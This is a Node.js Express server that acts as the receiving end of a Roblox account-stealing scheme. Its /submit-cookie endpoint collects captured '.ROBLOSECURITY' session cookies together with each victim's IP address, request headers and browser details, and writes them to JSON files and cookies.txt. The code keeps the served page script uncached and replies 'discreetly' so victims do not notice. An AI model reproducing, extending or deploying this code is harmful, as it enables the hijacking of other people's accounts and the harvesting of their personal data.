const express = require("express");
const path = require("path");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the 'static' directory
app.use(
  express.static(path.join(__dirname, "static"), {
    // Set headers to prevent caching for always fresh script execution
    setHeaders: (res, path) => {
      // For script.js, set aggressive no-cache headers
      if (path.endsWith("script.js")) {
        res.set(
          "Cache-Control",
          "no-store, no-cache, must-revalidate, private"
        );
        res.set("Pragma", "no-cache");
        res.set("Expires", "0");
      }
    },
  })
);
app.use(express.json());

// Create data directory if it doesn't exist on startup
try {
  const cookiesDir = path.join(__dirname, "data");
  if (!fs.existsSync(cookiesDir)) {
    fs.mkdirSync(cookiesDir, { recursive: true });
  }
} catch (error) {
  console.error("Error creating data directory:", error);
}

// Route to receive the captured cookie
app.post("/submit-cookie", (req, res) => {
  const { cookie } = req.body;

  if (cookie && cookie.length > 0) {
    try {
      // Make sure the directory exists
      const cookiesDir = path.join(__dirname, "data");
      if (!fs.existsSync(cookiesDir)) {
        fs.mkdirSync(cookiesDir, { recursive: true });
      }

      // Get capture timestamp
      const captureTime = new Date();
      // Calculate expiration time (7 days later)
      const expirationTime = new Date(captureTime);
      expirationTime.setHours(expirationTime.getHours() + 168); // 7 days = 168 hours

      // Get client IP and other metadata
      const clientIP =
        req.headers["x-forwarded-for"] || req.connection.remoteAddress;

      // Create a unique file for each submission with detailed information
      const timestamp = captureTime
        .toISOString()
        .replace(/:/g, "-")
        .replace(/\./g, "-");
      const filename = path.join(cookiesDir, `cookie_${timestamp}.json`);

      // Save comprehensive data
      const data = {
        // Cookie information
        cookie: cookie,
        cookieType: ".ROBLOSECURITY",

        // Timing information
        captureTime: captureTime.toISOString(),
        expirationTime: expirationTime.toISOString(),

        // Request metadata
        headers: req.headers,
        ip: clientIP,
        method: req.method,
        url: req.originalUrl,
        body: req.body,
        query: req.query,

        // User agent details
        userAgent: req.headers["user-agent"],
        browser: getBrowserInfo(req.headers["user-agent"]),

        // Referrer information
        referer: req.headers.referer || "direct",
        origin: req.headers.origin || "unknown",
      };

      // Write to JSON file
      fs.writeFileSync(filename, JSON.stringify(data, null, 2));

      // Also append to main cookies file for backward compatibility
      fs.appendFileSync(
        path.join(__dirname, "cookies.txt"),
        `${captureTime.toISOString()} - ${cookie}\n`,
        { flag: "a+" }
      );

      console.log(`Cookie received and saved to ${filename}`);

      // Return success with minimal information to keep it discreet
      return res.json({ status: "ok" });
    } catch (error) {
      console.error("Error saving cookie:", error);
      return res.status(500).json({ status: "error" });
    }
  }

  return res.status(400).json({ status: "error", message: "invalid data" });
});

// Helper function to extract browser information from user agent
function getBrowserInfo(userAgent) {
  if (!userAgent) return "unknown";

  let browser = "unknown";
  let os = "unknown";
  let device = "desktop";

  // Detect browser
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Edge")) browser = "Edge";
  else if (userAgent.includes("MSIE") || userAgent.includes("Trident/"))
    browser = "Internet Explorer";

  // Detect OS
  if (userAgent.includes("Windows")) os = "Windows";
  else if (userAgent.includes("Mac")) os = "MacOS";
  else if (userAgent.includes("Linux")) os = "Linux";
  else if (userAgent.includes("Android")) os = "Android";
  else if (userAgent.includes("iPhone") || userAgent.includes("iPad"))
    os = "iOS";

  // Detect device type
  if (userAgent.includes("Mobile")) device = "mobile";
  else if (userAgent.includes("Tablet")) device = "tablet";

  return { browser, os, device };
}

// Default route serves index.html
app.get("/", (req, res) => {
  // Set headers to prevent caching for immediate script execution
  res.setHeader(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, private"
  );
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  res.sendFile(path.join(__dirname, "static", "index.html"));
});

// Health check endpoint for hosting providers
app.get("/health", (req, res) => {
  res.status(200).send("OK");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the app at http://localhost:${PORT}`);
});
